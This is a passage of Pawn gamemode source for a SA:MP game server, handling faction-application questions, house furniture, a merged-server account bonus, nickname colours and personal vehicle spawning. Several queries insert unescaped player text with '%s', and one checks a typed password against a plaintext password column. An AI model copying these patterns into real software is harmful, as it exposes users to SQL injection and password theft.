				ShowPlayerDialog(playerid, DIALOG_APLICAQ9, DIALOG_STYLE_INPUT, "Question 9 of 10", MGLOBAL, "Trimite", "");
				return 1;
			}
			strcpy(raspunsfactiune8[playerid],inputtext,512);
			format(MGLOBAL, sizeof(MGLOBAL), "(!) Please answer this question more readable and as closely (!)\nHow would you describe the reality (minimum 10 words):");
			ShowPlayerDialog(playerid, DIALOG_APLICAQ10, DIALOG_STYLE_INPUT, "Question 10 of 10", MGLOBAL, "Send", "");
	    }
	}
	if(dialogid == DIALOG_APLICAQ10)
	{
	    if(response)
	    {
	        new stringmsg[3800];
            if(strlen(inputtext) < 10)
			{
			    format(MGLOBAL, sizeof(MGLOBAL), "(!) Please answer this question more readable and as closely (!)\nHow would you describe the reality (minimum 10 words):");
				ShowPlayerDialog(playerid, DIALOG_APLICAQ10, DIALOG_STYLE_INPUT, "Question 10 of 10", MGLOBAL, "Send", "");
				return 1;
			}
			strcpy(raspunsfactiune9[playerid],inputtext,512);
			format(stringmsg, sizeof(stringmsg), "%s, so show your application for faction %s, want to send for review or delete?\n\n",PlayerInfo[playerid][pNormalName], DynamicFactions[appfactiune[playerid]][fName]);
			format(stringmsg, sizeof(stringmsg), "%s\nName of applicant: %s\nLevel Applicants: %d\nApplicants hours: %d\n\n",stringmsg,PlayerInfo[playerid][pNormalName],PlayerInfo[playerid][pLevel],PlayerInfo[playerid][pConnectTime]);
			format(stringmsg, sizeof(stringmsg), "%s\nWhy do you want to go into %s (minimum 10 words): %s\nThe reason of leaving the last factor: %s\nHave you ever been banned?, if so, what was the reason? (honest answer): %s",stringmsg,DynamicFactions[appfactiune[playerid]][fName],raspunsfactiune[playerid],raspunsfactiune2[playerid],raspunsfactiune3[playerid]);
			format(stringmsg, sizeof(stringmsg), "%s\nHave you ever been part of %s?If yes , why you left this faction?: %s\nHow much time do you spend on SA:MP without AFK (hours): %s\nYou agree to stay in %s minimum 14 days?: %s", stringmsg, DynamicFactions[appfactiune[playerid]][fName], raspunsfactiune4[playerid], raspunsfactiune5[playerid],DynamicFactions[appfactiune[playerid]][fName], raspunsfactiune6[playerid]);
			format(stringmsg, sizeof(stringmsg), "%s\nYou had / have problems with someone faction %s?: %s\nYou will meet the leader and members of higher rank %s?: %s\nHow would you describe the reality (minimum 10 words): %s\n\n\n",stringmsg, DynamicFactions[appfactiune[playerid]][fName], raspunsfactiune7[playerid],DynamicFactions[appfactiune[playerid]][fName],raspunsfactiune8[playerid],raspunsfactiune9[playerid]);
			format(stringmsg, sizeof(stringmsg), "%s{FFFFFF}({FF0000}!{FFFFFF}) Please note if you click 'Send' will not be able to apply for a faction application is not rejected / accepted. {FFFFFF}({FF0000}!{FFFFFF})",stringmsg);
			ShowPlayerDialog(playerid, DIALOG_APLICAQ11, DIALOG_STYLE_MSGBOX, "Send application...",stringmsg, "Send", "Delete");
	    }
	}
	if(dialogid == DIALOG_APLICAQ11)
	{
	    if(response)
	    {
	        new stringsql[3800];
			SCM(playerid, COLOR_ERROR, "The application has been sent, it is under review'll receive a notification (/ email) when you rejected / accepted.");
			mysql_format(SQL, stringsql, sizeof(string), "INSERT INTO aplications (`factionid`,`playerid`) VALUES ('%d','%d')",appfactiune[playerid],PlayerInfo[playerid][pSQLID]);
			mysql_tquery(SQL, stringsql, "", "");
			mysql_format(SQL, stringsql, sizeof(stringsql), "UPDATE `aplications` SET `r1`='%s',`r2`='%s',`r3`='%s' WHERE `playerid`='%d' AND `factionid`='%d'",raspunsfactiune[playerid],raspunsfactiune2[playerid],raspunsfactiune3[playerid],PlayerInfo[playerid][pSQLID],appfactiune[playerid]);
			mysql_tquery(SQL, stringsql, "", "");
			mysql_format(SQL, stringsql, sizeof(stringsql), "UPDATE `aplications` SET `r4`='%s',`r5`='%s',`r6`='%s' WHERE `playerid`='%d' AND `factionid`='%d'",raspunsfactiune4[playerid],raspunsfactiune5[playerid],raspunsfactiune6[playerid],PlayerInfo[playerid][pSQLID], appfactiune[playerid]);
            mysql_tquery(SQL, stringsql, "", "");
            mysql_format(SQL, stringsql, sizeof(stringsql), "UPDATE `aplications` SET `r7`='%s',`r8`='%s',`r9`='%s' WHERE `playerid`='%d' AND `factionid`='%d'",raspunsfactiune7[playerid],raspunsfactiune8[playerid],raspunsfactiune9[playerid],PlayerInfo[playerid][pSQLID], appfactiune[playerid]);
            mysql_tquery(SQL, stringsql, "", "");
            mysql_format(SQL, stringsql, sizeof(stringsql), "UPDATE `users` SET `aplicatie`='%d' WHERE `id`='%d'", appfactiune[playerid],PlayerInfo[playerid][pSQLID]);
			mysql_tquery(SQL, stringsql, "", "");
		}
	    else
	    {
	        SCM(playerid, COLOR_ERROR, "The application has been deleted!");
	    }
	}
	/*if(dialogid == DIALOG_BONUSURI)
	{
	    if(response)
	    {
			if(citeste10sec[playerid] > 0)
			{
			    SCM(playerid, COLOR_SERVER, "Te rugam sa citesti acest mesaj!");
			    format(MGLOBAL, sizeof(MGLOBAL), "{A9C4E4}** {FFFFFF}Salutare, in primul rand vreau sa iti multumesc ca ai ales serverul nostru, drept prima ta rasplata pentru inregistrare ai primit $100,000,000 + LEVEL 10 + 500 Puncte Premium {A9C4E4}**");
				format(MGLOBAL, sizeof(MGLOBAL), "%s\n{A9C4E4}** {FFFFFF}In timp ce avansezi in nivel vei primi urmatoarele bonusurii:{A9C4E4} **\n",MGLOBAL);
				format(MGLOBAL, sizeof(MGLOBAL), "%s{FFFFFF}Nivel 4 (primul [/buylevel]) - $10,000,000\nNivel 5 (al doilea [/buylevel]) - $20,000,000\nNivel 6 (al treilea [/buylevel]) - $30,0000,000\n{FF0000}** {FFFFFF}Nivel 7 (al patrulea [/buylevel]) - $40,000,000 + 20 RP + LEVEL UP{FF0000}**\n{A9C4E4}Iti uram un joc placut!", MGLOBAL);
				ShowPlayerDialog(playerid, DIALOG_BONUSURI, DIALOG_STYLE_MSGBOX, "Despre avere (bonusuri).", MGLOBAL, "Am inteles", "");
			}
	    }
	    else
	    {
	        if(citeste10sec[playerid] > 0)
			{
			    SCM(playerid, COLOR_SERVER, "Te rugam sa citesti acest mesaj!");
			    format(MGLOBAL, sizeof(MGLOBAL), "{A9C4E4}** {FFFFFF}Salutare, in primul rand vreau sa iti multumesc ca ai ales serverul nostru, drept prima ta rasplata pentru inregistrare ai primit $100,000,000 + LEVEL 10 + 500 Puncte Premium {A9C4E4}**");
				format(MGLOBAL, sizeof(MGLOBAL), "%s\n{A9C4E4}** {FFFFFF}In timp ce avansezi in nivel vei primi urmatoarele bonusurii:{A9C4E4} **\n",MGLOBAL);
				format(MGLOBAL, sizeof(MGLOBAL), "%s{FFFFFF}Nivel 4 (primul [/buylevel]) - $10,000,000\nNivel 5 (al doilea [/buylevel]) - $20,000,000\nNivel 6 (al treilea [/buylevel]) - $30,0000,000\n{FF0000}** {FFFFFF}Nivel 7 (al patrulea [/buylevel]) - $40,000,000 + 20 RP + LEVEL UP{FF0000}**\n{A9C4E4}Iti uram un joc placut!", MGLOBAL);
				ShowPlayerDialog(playerid, DIALOG_BONUSURI, DIALOG_STYLE_MSGBOX, "Despre avere (bonusuri).", MGLOBAL, "Am inteles", "");
			}
	    }
	}*/
	switch(dialogid)
	{
	    case DIALOG_HOUSE+11:
		{
		    if(!response) return SCM(playerid, COLOR_ERROR, "you canceled");
	        new id = InHouse[playerid], name[24];
	        if(id == INVALID_HOUSE_ID) return SendClientMessage(playerid, 0xE74C3CFF, "You must be in a house.");
			GetPlayerName(playerid, name, MAX_PLAYER_NAME);


			if(listitem == 0)
			{
			    new list[1024];
			    for(new i; i < sizeof(HouseFurnitures); ++i)
			    {
			        format(list, sizeof(list), "%s%s\t$%s\n", list, HouseFurnitures[i][Name3], FormatNumber(HouseFurnitures[i][Price]));
			    }
			    format(MGLOBAL, sizeof(MGLOBAL), "Item\tPret\n%s", list);
			    ShowPlayerDialog(playerid, DIALOG_HOUSE+12, DIALOG_STYLE_TABLIST_HEADERS, "Buy Furniture", MGLOBAL, "Buy", "Back");
			}

			if(listitem == 1)
			{
				SelectMode[playerid] = SELECT_MODE_EDIT;
			    SelectObject(playerid);
			    SendClientMessage(playerid, 0xFFFFFFFF, "Please click on the furniture that you want to edit.");
			}

			if(listitem == 2)
			{
			    SelectMode[playerid] = SELECT_MODE_SELL;
			    SelectObject(playerid);
			    SendClientMessage(playerid, 0xFFFFFFFF, "Please click on the furniture that you want to sell.");
			}
		    return 1;
		}

		case DIALOG_HOUSE+12:
		{
		    new query[1024];
		    if(!response) return SCM(playerid, COLOR_ERROR, "you canceled");
	        new id = InHouse[playerid], name[24];
	        if(id == INVALID_HOUSE_ID) return SendClientMessage(playerid, 0xE74C3CFF, "You must be in a house.");
			GetPlayerName(playerid, name, MAX_PLAYER_NAME);
			if(HouseFurnitures[listitem][Price] > PlayerInfo[playerid][pCash]) return SendClientMessage(playerid, 0xE74C3CFF, "You do not have enough money.");
			GivePlayerCash(playerid, -HouseFurnitures[listitem][Price]);
			new Float: x, Float: y, Float: z;
			GetPlayerPos(playerid, x, y, z);
	        GetXYInFrontOfPlayer(playerid, x, y, 3.0);
	        new objectid = CreateDynamicObject(HouseFurnitures[listitem][ModelID], x, y, z, 0.0, 0.0, 0.0, GetPlayerVirtualWorld(playerid), GetPlayerInterior(playerid));
			mysql_format(SQL, query, sizeof(query), "INSERT INTO housefurnitures SET HouseID=%d, FurnitureID=%d, FurnitureX=%f, FurnitureY=%f, FurnitureZ=%f, FurnitureVW=%d, FurnitureInt=%d", id, listitem, x, y, z, GetPlayerVirtualWorld(playerid), GetPlayerInterior(playerid));
			new Cache: add = mysql_query(SQL, query), data[e_furniture];
	        data[SQLID] = cache_insert_id();
			data[HouseIDF] = id;
	        data[ArrayID] = listitem;
			data[furnitureX] = x;
			data[furnitureY] = y;
			data[furnitureZ] = z;
			data[furnitureRX] = 0.0;
			data[furnitureRY] = 0.0;
			data[furnitureRZ] = 0.0;
			cache_delete(add);
			Streamer_SetArrayData(STREAMER_TYPE_OBJECT, objectid, E_STREAMER_EXTRA_ID, data);
			EditDynamicObject(playerid, objectid);
			return 1;
		}
		case DIALOG_HOUSE+13:
		{
		    new query[1024];
		    if(!response) return 1;
	        new id = InHouse[playerid], name[24];
	        if(id == INVALID_HOUSE_ID) return SendClientMessage(playerid, 0xE74C3CFF, "You must be in a house.");
			GetPlayerName(playerid, name, MAX_PLAYER_NAME);

			new objectid = GetPVarInt(playerid, "SelectedFurniture"), data[e_furniture];
			Streamer_GetArrayData(STREAMER_TYPE_OBJECT, objectid, E_STREAMER_EXTRA_ID, data);
			GivePlayerCash(playerid, HouseFurnitures[ data[ArrayID] ][Price]);
			mysql_format(SQL, query, sizeof(query), "DELETE FROM housefurnitures WHERE ID=%d", data[SQLID]);
			mysql_tquery(SQL, query, "", "");
			DestroyDynamicObject(objectid);
			DeletePVar(playerid, "SelectedFurniture");
			return 1;
		}
	}
	if(dialogid == DIALOG_USEBGAMEACCOUNT)
	{
	    if(response)
		{
		    if(strlen(inputtext) > 2)
 	        {
 	            for(new i; i < sizeof(antisqlinjection); i++)
				{
    				if(strfind(inputtext, antisqlinjection[i], true) != -1)
        			{
		      			SCM(playerid, COLOR_ERROR, "There are also characters permitted.");
           				return 1;
			        }
				}
 	            new var100[1000];
                new cont = MySQLCheckAccount2(inputtext);
				if(cont == 0) return SCM(playerid,COLOR_ERROR,"This name does not exist."),ShowPlayerDialog(playerid, DIALOG_USEBGAMEACCOUNT, DIALOG_STYLE_INPUT, "SERVER ACCOUNT", "Deoarece serverul TopGame s-a unit cu serverul Magic-Gaming vei primi un bonus daca esti de pe serverul Magic-Gaming, aceasta actiune poate fi folosita doar o singura data\nIntrodu numele de pe serverul Magic-Gaming\nAtentie: Numele corect, fara tag sau spatiu.", "Terminat", "CANCEL");
                mysql_format(SQL, var100, sizeof(var100), "SELECT * FROM `users2` WHERE `id`='%d' AND `bonusluat`='0'", cont);
				new Cache: serverbonus = mysql_query(SQL, var100);
				if(cache_get_row_count() > 0)
				{
					format(MGLOBAL, sizeof(MGLOBAL), "Enter password server ToPZoNe account: %s", inputtext);
					ShowPlayerDialog(playerid, DIALOG_USEBGAMEACCOUNTPASS, DIALOG_STYLE_INPUT, "SERVER ACCOUNT", MGLOBAL, "Completed", "CANCEL");
					adaugarebonus[playerid] = cont;
				}
				else
				{
				    SCM(playerid, COLOR_SERVER, "Another user know the password to this account and lifted bonus");
				}
				cache_delete(serverbonus);
			}
  			else
    		{

 	            SCM(playerid, COLOR_ERROR, "The name must contain at least 3 characters.");
 	            ShowPlayerDialog(playerid, DIALOG_USEBGAMEACCOUNT, DIALOG_STYLE_INPUT, "SERVER ACCOUNT", "Because the server TopZone merged with server TopZone will receive a bonus if you're server TopZone, this action can be used only once \nIntrodu name server TopZone \nAtentie: correct name, without tag or space.", "Completed", "CANCEL");
		 	}
		}
		else
		{
		    SCM(playerid, COLOR_ERROR, "You canceled");
		}
	}
	if(dialogid == DIALOG_USEBGAMEACCOUNTPASS)
	{
	    if(response)
	    {
	        for(new i; i < sizeof(antisqlinjection); i++)
			{
				if(strfind(inputtext, antisqlinjection[i], true) != -1)
 				{
		      		SCM(playerid, COLOR_ERROR, "There are also characters permitted.");
           			return 1;
     			}
			}
    		new var100[1000],orejucate;
			mysql_format(SQL, var100, sizeof(var100), "SELECT * FROM `users2` WHERE `id`='%d' AND `parolawqewqeqw89`='%s'", adaugarebonus[playerid],inputtext);
			new Cache: serverbonus = mysql_query(SQL, var100);
			if(cache_get_row_count() > 0)
			{
				for(new i, j = cache_get_row_count (); i != j; ++i)
				{
				    orejucate = cache_get_field_content_int(i, "ConnectedTime");
				    if(orejucate >= 1)
				    {
					    PlayerInfo[playerid][pConnectTime] = orejucate;
						PlayerInfo[playerid][pLevel] += 10;
						GivePlayerCash(playerid, 60000000);
						Update(playerid, pCashx);
						Update(playerid, pLevelx);
						Update(playerid, pConnectTimex);
						format(MGLOBAL, sizeof(MGLOBAL), "You primitive received $60,000,000 LEVEL UP + 10 & %d hours played, We wish you a pleasant game continues!", orejucate);
						SCM(playerid, COLOR_SERVER, MGLOBAL);
						mysql_format(SQL, var100, sizeof(var100), "UPDATE `users` SET `bonusluat` ='1' WHERE `id`='%d'",PlayerInfo[playerid][pSQLID]);
						mysql_tquery(SQL, var100, "","");
						mysql_format(SQL, var100, sizeof(var100), "UPDATE `users2` SET `bonusluat` ='1' WHERE `id`='%d'",adaugarebonus[playerid]);
						mysql_tquery(SQL, var100, "","");
					}
					else
					{
					    SCM(playerid, COLOR_ERROR, "That account must have at least an hour played.");
					}
				}
			}
			else
			{
				format(MGLOBAL, sizeof(MGLOBAL), "incorrect password!\nEnter password server TopZone with attention!");
				ShowPlayerDialog(playerid, DIALOG_USEBGAMEACCOUNTPASS, DIALOG_STYLE_INPUT, "SERVER ACCOUNT", MGLOBAL, "Completed", "CANCEL");
			}
			cache_delete(serverbonus);
		}
		else
		{
		    SCM(playerid, COLOR_ERROR, "You canceled");
		}
	}
	if(dialogid == 6267)
	{
	    if(response)
		{
		    switch(listitem)
		    {
		        case 0:
		        {
		            PlayerInfo[playerid][pColor] = 0;
		            SCM(playerid, COLOR_SERVER,"{CECECE}Server:{FFFFFF} Nick color changed! Hope you like the new color!");
		        }
		        case 1:
		        {
		            PlayerInfo[playerid][pColor] = 1;
		            SCM(playerid, COLOR_SERVER,"{4169E1}Server:{FFFFFF} Nick color changed! Hope you like the new color!");
		        }
		        case 2:
		        {
		            PlayerInfo[playerid][pColor] = 2;
		            SCM(playerid, COLOR_SERVER,"{662BBE}Server:{FFFFFF} Nick color changed! Hope you like the new color!");
		        }
				case 3:
		        {
		            PlayerInfo[playerid][pColor] = 3;
		            SCM(playerid, COLOR_SERVER,"{FFE600}Server:{FFFFFF} Nick color changed! Hope you like the new color!");
		        }
				case 4:
		        {
		            PlayerInfo[playerid][pColor] = 4;
		            SCM(playerid, COLOR_SERVER,"{FF00FF}Server:{FFFFFF} Nick color changed! Hope you like the new color!");
		        }
		        case 5:
		        {
		            PlayerInfo[playerid][pColor] = 5;
		            SCM(playerid, COLOR_SERVER,"{3FFF3F}Server:{FFFFFF} Nick color changed! Hope you like the new color!");
		        }
		        case 6:
		        {
		            PlayerInfo[playerid][pColor] = 6;
		            SCM(playerid, COLOR_SERVER,"{83D553}Server:{FFFFFF} Nick color changed! Hope you like the new color!");
		        }
				case 7:
		        {
		            PlayerInfo[playerid][pColor] = 7;
		            SCM(playerid, COLOR_SERVER,"{187700}Server:{FFFFFF} Nick color changed! Hope you like the new color!");
		        }
				case 8:
		        {
		            PlayerInfo[playerid][pColor] = 8;
		            SCM(playerid, COLOR_SERVER,"{FF9A00}Server:{FFFFFF} Nick color changed! Hope you like the new color!");
		        }
		        case 9:
		        {
		            PlayerInfo[playerid][pColor] = 9;
		            SCM(playerid, COLOR_SERVER,"{222222}Server:{FFFFFF} Nick color changed! Hope you like the new color!");
		        }
				case 10:
		        {
		            PlayerInfo[playerid][pColor] = 10;
		            SCM(playerid, COLOR_SERVER,"{FF2C9D}Server:{FFFFFF} Nick color changed! Hope you like the new color!");
		        }
				case 11:
		        {
		            PlayerInfo[playerid][pColor] = 11;
		            SCM(playerid, COLOR_SERVER,"{8000FF}Server:{FFFFFF} Nick color changed! Hope you like the new color!");
		        }
				case 12:
		        {
		            PlayerInfo[playerid][pColor] = 12;
		            SCM(playerid, COLOR_SERVER,"{00FFEE}Server:{FFFFFF} Nick color changed! Hope you like the new color!");
		        }
				case 13:
		        {
		            PlayerInfo[playerid][pColor] = 13;
		            SCM(playerid, COLOR_SERVER,"{FF0000}Server:{FFFFFF} Nick color changed! Hope you like the new color!");
		        }
		    }
		}
	}
	if(dialogid == DIALOG_VEHSPAWN)
	{
	    if(response)
	    {
	    	if(listitem == 0)
			{
				new stringg[456];
				new carid = PlayerInfo[playerid][pPcarkey];
				if(carid == 0) return 1;
				if(personalcar[0][playerid] != 0)
	   			{
		   			format(stringg, sizeof(stringg), "Manage your %s (%d)",CarInfo[carid][cDescription],CarInfo[carid][cID]);
					ShowPlayerDialog(playerid,DIALOG_VEHSPAWN1,DIALOG_STYLE_LIST,stringg,"{FFFFFF}Vehicle Info\nTow vehicle\nFind Vehicle\nBuy Insurance\nClear Age and KM - {FFFF00}20 premium points\nDespawn Car","Select","Close");
	   			}
	   			else
	   			{
					format(stringg, sizeof(stringg), "Manage your %s (%d)",CarInfo[carid][cDescription],CarInfo[carid][cID]);
					ShowPlayerDialog(playerid,DIALOG_VEHSPAWN1,DIALOG_STYLE_LIST,stringg,"{FFFFFF}Vehicle Info\nTow vehicle\nFind Vehicle\nBuy Insurance\nClear Age and KM - {FFFF00}20 premium points\nDespawn Car","Select","Close");
			    	new car = CreateVehicle(CarInfo[carid][cModel],CarInfo[carid][cLocationx],CarInfo[carid][cLocationy],CarInfo[carid][cLocationz],CarInfo[carid][cAngle],CarInfo[carid][cColorOne],CarInfo[carid][cColorTwo],500000);
			    	SetVehicleNumberPlate(car, CarInfo[carid][cLicense]);
					SetVehicleHealth(car, CarInfo[carid][cHP]);
					UpdateVehicleDamageStatus(car, CarInfo[carid][cDamage1], CarInfo[carid][cDamage2], CarInfo[carid][cDamage3], CarInfo[carid][cDamage4]);
					Gas[car] = CarInfo[carid][cGas];
					new engine,lights,alarm,doors,bonnet,boot,objective;
					if(CarInfo[carid][cLock] == 1)
					{
						GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
			    		SetVehicleParamsEx(car,engine,lights,alarm,1,bonnet,boot,objective);
					}
					if(CarInfo[carid][cLock] == 0)
					{
						GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
			    		SetVehicleParamsEx(car,engine,lights,alarm,0,bonnet,boot,objective);
					}
					OwnedVeh(car) = carid;
					personalcar[0][playerid] = car;
					SwitchKey[playerid] = 1;
					ModVehicle(car);
					DespawnCar[playerid][0] = 600;
	   			}
   			}
   			if(listitem == 1)
			{
				new stringg[456];
				new carid = PlayerInfo[playerid][pmotokey];
				if(carid == 0) return 1;
				if(personalcar[1][playerid] != 0)
	   			{
		   			format(stringg, sizeof(stringg), "Manage your %s (%d)",CarInfo[carid][cDescription],CarInfo[carid][cID]);
					ShowPlayerDialog(playerid,DIALOG_VEHSPAWN2,DIALOG_STYLE_LIST,stringg,"{FFFFFF}Vehicle Info\nTow vehicle\nFind Vehicle\nBuy Insurance\nClear Age and KM - {FFFF00}20 premium points\nDespawn Car","Select","Close");
	   			}
	   			else
	   			{
					format(stringg, sizeof(stringg), "Manage your %s (%d)",CarInfo[carid][cDescription],CarInfo[carid][cID]);
					ShowPlayerDialog(playerid,DIALOG_VEHSPAWN2,DIALOG_STYLE_LIST,stringg,"{FFFFFF}Vehicle Info\nTow vehicle\nFind Vehicle\nBuy Insurance\nClear Age and KM - {FFFF00}20 premium points\nDespawn Car","Select","Close");
                    new car = CreateVehicle(CarInfo[carid][cModel],CarInfo[carid][cLocationx],CarInfo[carid][cLocationy],CarInfo[carid][cLocationz],CarInfo[carid][cAngle],CarInfo[carid][cColorOne],CarInfo[carid][cColorTwo],500000);
			    	SetVehicleNumberPlate(car, CarInfo[carid][cLicense]);
					SetVehicleHealth(car, CarInfo[carid][cHP]);
					UpdateVehicleDamageStatus(car, CarInfo[carid][cDamage1], CarInfo[carid][cDamage2], CarInfo[carid][cDamage3], CarInfo[carid][cDamage4]);
					Gas[car] = CarInfo[carid][cGas];
					new engine,lights,alarm,doors,bonnet,boot,objective;
					if(CarInfo[carid][cLock] == 1)
					{
						GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
			    		SetVehicleParamsEx(car,engine,lights,alarm,1,bonnet,boot,objective);
					}
					if(CarInfo[carid][cLock] == 0)
					{
						GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
			    		SetVehicleParamsEx(car,engine,lights,alarm,0,bonnet,boot,objective);
					}
					OwnedVeh(car) = carid;
					personalcar[1][playerid] = car;
					SwitchKey[playerid] = 1;
					ModVehicle(car);
					DespawnCar[playerid][1] = 600;
		   		}
			}
   			if(listitem == 2)
			{
				new stringg[456];
				new carid = PlayerInfo[playerid][pprcarkey];
				if(carid == 0) return 1;
				if(personalcar[2][playerid] != 0)
	   			{
		   			format(stringg, sizeof(stringg), "Manage your %s (%d)",CarInfo[carid][cDescription],CarInfo[carid][cID]);
					ShowPlayerDialog(playerid,DIALOG_VEHSPAWN3,DIALOG_STYLE_LIST,stringg,"{FFFFFF}Vehicle Info\nTow vehicle\nFind Vehicle\nBuy Insurance\nClear Age and KM - {FFFF00}20 premium points\nDespawn Car","Select","Close");
	   			}
	   			else
	   			{
					format(stringg, sizeof(stringg), "Manage your %s (%d)",CarInfo[carid][cDescription],CarInfo[carid][cID]);
					ShowPlayerDialog(playerid,DIALOG_VEHSPAWN3,DIALOG_STYLE_LIST,stringg,"{FFFFFF}Vehicle Info\nTow vehicle\nFind Vehicle\nBuy Insurance\nClear Age and KM - {FFFF00}20 premium points\nDespawn Car","Select","Close");
                    new car = CreateVehicle(CarInfo[carid][cModel],CarInfo[carid][cLocationx],CarInfo[carid][cLocationy],CarInfo[carid][cLocationz],CarInfo[carid][cAngle],CarInfo[carid][cColorOne],CarInfo[carid][cColorTwo],500000);
			    	SetVehicleNumberPlate(car, CarInfo[carid][cLicense]);
					SetVehicleHealth(car, CarInfo[carid][cHP]);
					UpdateVehicleDamageStatus(car, CarInfo[carid][cDamage1], CarInfo[carid][cDamage2], CarInfo[carid][cDamage3], CarInfo[carid][cDamage4]);
					Gas[car] = CarInfo[carid][cGas];
					new engine,lights,alarm,doors,bonnet,boot,objective;
					if(CarInfo[carid][cLock] == 1)
					{
						GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
			    		SetVehicleParamsEx(car,engine,lights,alarm,1,bonnet,boot,objective);
					}
					if(CarInfo[carid][cLock] == 0)
					{
						GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
			    		SetVehicleParamsEx(car,engine,lights,alarm,0,bonnet,boot,objective);
					}
					OwnedVeh(car) = carid;
					personalcar[2][playerid] = car;
					SwitchKey[playerid] = 1;
					ModVehicle(car);
					DespawnCar[playerid][2] = 600;
				}
			}
   			if(listitem == 3)
			{
				new stringg[456];
				new carid = PlayerInfo[playerid][pprcarkey2];
				if(carid == 0) return 1;
				if(personalcar[3][playerid] != 0)
	   			{
		   			format(stringg, sizeof(stringg), "Manage your %s (%d)",CarInfo[carid][cDescription],CarInfo[carid][cID]);
					ShowPlayerDialog(playerid,DIALOG_VEHSPAWN4,DIALOG_STYLE_LIST,stringg,"{FFFFFF}Vehicle Info\nTow vehicle\nFind Vehicle\nBuy Insurance\nClear Age and KM - {FFFF00}20 premium points\nDespawn Car","Select","Close");
	   			}
	   			else
	   			{
					format(stringg, sizeof(stringg), "Manage your %s (%d)",CarInfo[carid][cDescription],CarInfo[carid][cID]);
					ShowPlayerDialog(playerid,DIALOG_VEHSPAWN4,DIALOG_STYLE_LIST,stringg,"{FFFFFF}Vehicle Info\nTow vehicle\nFind Vehicle\nBuy Insurance\nClear Age and KM - {FFFF00}20 premium points\nDespawn Car","Select","Close");
                    new car = CreateVehicle(CarInfo[carid][cModel],CarInfo[carid][cLocationx],CarInfo[carid][cLocationy],CarInfo[carid][cLocationz],CarInfo[carid][cAngle],CarInfo[carid][cColorOne],CarInfo[carid][cColorTwo],500000);
			    	SetVehicleNumberPlate(car, CarInfo[carid][cLicense]);
					SetVehicleHealth(car, CarInfo[carid][cHP]);
					UpdateVehicleDamageStatus(car, CarInfo[carid][cDamage1], CarInfo[carid][cDamage2], CarInfo[carid][cDamage3], CarInfo[carid][cDamage4]);
					Gas[car] = CarInfo[carid][cGas];
					new engine,lights,alarm,doors,bonnet,boot,objective;
					if(CarInfo[carid][cLock] == 1)
					{
						GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
			    		SetVehicleParamsEx(car,engine,lights,alarm,1,bonnet,boot,objective);
					}
					if(CarInfo[carid][cLock] == 0)
					{
						GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
			    		SetVehicleParamsEx(car,engine,lights,alarm,0,bonnet,boot,objective);
					}
					OwnedVeh(car) = carid;
					personalcar[3][playerid] = car;
					SwitchKey[playerid] = 1;
					ModVehicle(car);
					DespawnCar[playerid][3] = 600;
				}
			}
			if(listitem == 4)
			{
				new stringg[456];
				new carid = PlayerInfo[playerid][pPPluscarkey];
				if(carid == 0) return 1;
				if(personalcar[4][playerid] != 0)
	   			{
		   			format(stringg, sizeof(stringg), "Manage your %s (%d)",CarInfo[carid][cDescription],CarInfo[carid][cID]);
					ShowPlayerDialog(playerid,DIALOG_VEHSPAWN5,DIALOG_STYLE_LIST,stringg,"{FFFFFF}Vehicle Info\nTow vehicle\nFind Vehicle\nBuy Insurance\nClear Age and KM - {FFFF00}20 premium points\nDespawn Car","Select","Close");
	   			}
	   			else
	   			{
					format(stringg, sizeof(stringg), "Manage your %s (%d)",CarInfo[carid][cDescription],CarInfo[carid][cID]);
					ShowPlayerDialog(playerid,DIALOG_VEHSPAWN5,DIALOG_STYLE_LIST,stringg,"{FFFFFF}Vehicle Info\nTow vehicle\nFind Vehicle\nBuy Insurance\nClear Age and KM - {FFFF00}20 premium points\nDespawn Car","Select","Close");
                    new car = CreateVehicle(CarInfo[carid][cModel],CarInfo[carid][cLocationx],CarInfo[carid][cLocationy],CarInfo[carid][cLocationz],CarInfo[carid][cAngle],CarInfo[carid][cColorOne],CarInfo[carid][cColorTwo],500000);
			    	SetVehicleNumberPlate(car, CarInfo[carid][cLicense]);
					SetVehicleHealth(car, CarInfo[carid][cHP]);
					UpdateVehicleDamageStatus(car, CarInfo[carid][cDamage1], CarInfo[carid][cDamage2], CarInfo[carid][cDamage3], CarInfo[carid][cDamage4]);
					Gas[car] = CarInfo[carid][cGas];
					new engine,lights,alarm,doors,bonnet,boot,objective;
					if(CarInfo[carid][cLock] == 1)
					{
						GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
			    		SetVehicleParamsEx(car,engine,lights,alarm,1,bonnet,boot,objective);
					}
					if(CarInfo[carid][cLock] == 0)
					{
						GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
			    		SetVehicleParamsEx(car,engine,lights,alarm,0,bonnet,boot,objective);
					}
					OwnedVeh(car) = carid;
					personalcar[4][playerid] = car;
					SwitchKey[playerid] = 1;
					ModVehicle(car);
					DespawnCar[playerid][4] = 600;
				}
			}
			if(listitem == 5)
			{
				new stringg[456];
				new carid = PlayerInfo[playerid][pPPluscarkey2];
				if(carid == 0) return 1;
				if(personalcar[5][playerid] != 0)
	   			{
		   			format(stringg, sizeof(stringg), "Manage your %s (%d)",CarInfo[carid][cDescription],CarInfo[carid][cID]);
					ShowPlayerDialog(playerid,DIALOG_VEHSPAWN6,DIALOG_STYLE_LIST,stringg,"{FFFFFF}Vehicle Info\nTow vehicle\nFind Vehicle\nBuy Insurance\nClear Age and KM - {FFFF00}20 premium points\nDespawn Car","Select","Close");
	   			}
	   			else
	   			{
					format(stringg, sizeof(stringg), "Manage your %s (%d)",CarInfo[carid][cDescription],CarInfo[carid][cID]);
					ShowPlayerDialog(playerid,DIALOG_VEHSPAWN6,DIALOG_STYLE_LIST,stringg,"{FFFFFF}Vehicle Info\nTow vehicle\nFind Vehicle\nBuy Insurance\nClear Age and KM - {FFFF00}20 premium points\nDespawn Car","Select","Close");
